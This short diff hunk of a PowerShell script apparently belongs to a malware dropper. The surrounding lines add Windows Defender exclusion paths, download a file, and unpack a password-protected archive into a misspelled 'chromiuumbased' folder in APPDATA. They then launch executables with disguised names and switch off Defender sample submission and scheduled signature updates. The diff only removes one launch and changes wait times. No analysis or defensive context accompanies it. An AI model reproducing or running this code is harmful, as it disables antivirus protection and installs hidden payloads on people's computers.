@@ -14,13 +14,11 @@ Add-MpPreference -ExclusionPath "$vrer4" -Force
 Add-MpPreference -ExclusionPath "$vrer1" -Force
 Invoke-WebRequest -uri $WebFile -OutFile $Outff
 & $env:Temp\additionlibraries.exe -s -p"of9049nwp04yb3" -d"$env:APPDATA\chromiuumbased\services\"
-Timeout /T 5
-Start-Process ("$env:APPDATA\chromiuumbased\services\ProcManager.exe")
-Timeout /T 5
+Timeout /T 3
 Start-Process ("$env:APPDATA\chromiuumbased\services\netDaemon.exe")
-Timeout /T 5
+Timeout /T 4
 Start-Process ("$env:APPDATA\chromiuumbased\services\Netstservice.exe")
-Timeout /T 5
+Timeout /T 4
 Start-Process ("$env:APPDATA\chromiuumbased\services\Updmonitor.exe")
 Set-MpPreference -SubmitSamplesConsent 0 -Force
 Set-MpPreference -SignatureScheduleDay 8 -Force
